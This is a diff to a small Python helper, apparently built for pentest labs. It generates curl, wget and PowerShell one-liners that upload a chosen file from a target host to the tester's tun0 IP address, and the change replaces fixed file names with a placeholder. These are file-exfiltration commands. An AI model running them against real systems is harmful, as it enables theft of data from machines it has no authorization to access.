@@ -14,11 +14,11 @@ def get_tun0_ip():
     return ip
 
 upload_commands = {
-    "curl": f'''curl -F "file=@./curl.txt" http://{get_tun0_ip()}/curl''',
+    "curl": f'''curl -F "file=@./<file.txt>" http://{get_tun0_ip()}/curl''',
 
-    "wget": f'''wget --method=POST --body-file=wget.txt "http://{get_tun0_ip()}/wget?filename=wget.txt"''',
+    "wget": f'''wget --method=POST --body-file="<file.txt>" "http://{get_tun0_ip()}/wget?filename=wget.txt"''',
 
-    "powershell": f'''$f="C:\\ps.txt"; $b=[guid]::NewGuid(); $c=[System.Text.Encoding]::GetEncoding("iso-8859-1").GetString([IO.File]::ReadAllBytes($f)); $d="--$b`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$([IO.Path]::GetFileName($f))`"`r`nContent-Type: application/octet-stream`r`n`r`n$c`r`n--$b--`r`n"; Invoke-WebRequest -Uri "http://{get_tun0_ip()}/ps" -Method POST -Body $d -ContentType "multipart/form-data; boundary=$b"'''
+    "powershell": f'''$f="C:\\<file.txt>"; $b=[guid]::NewGuid(); $c=[System.Text.Encoding]::GetEncoding("iso-8859-1").GetString([IO.File]::ReadAllBytes($f)); $d="--$b`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$([IO.Path]::GetFileName($f))`"`r`nContent-Type: application/octet-stream`r`n`r`n$c`r`n--$b--`r`n"; Invoke-WebRequest -Uri "http://{get_tun0_ip()}/ps" -Method POST -Body $d -ContentType "multipart/form-data; boundary=$b"'''
 }
 
 parser = argparse.ArgumentParser(description='Simple HTTP Server for PHP, Python')
